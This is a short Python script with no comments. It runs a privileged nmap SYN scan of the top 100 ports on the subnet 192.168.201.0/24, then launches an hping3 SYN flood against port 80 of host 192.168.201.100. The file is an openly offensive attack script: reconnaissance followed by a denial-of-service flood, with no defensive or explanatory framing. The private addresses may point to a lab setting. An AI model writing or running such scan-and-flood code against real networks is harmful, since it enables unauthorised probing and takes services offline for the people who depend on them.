import subprocess

p1= subprocess.run(['sudo', 'nmap', '-sS', '--top-ports', '100', '-T4', '192.168.201.0/24'],
                   capture_output=True,
                   text=True)
for line in p1.stdout.splitlines():
    print(line)

p2 = subprocess.run(['sudo', 'hping3', '-S', '-p', '80', '--flood', '-q', '192.168.201.100'],
                    capture_output=True,
                    text=True)
for line in p2.stdout.splitlines():
    print(line)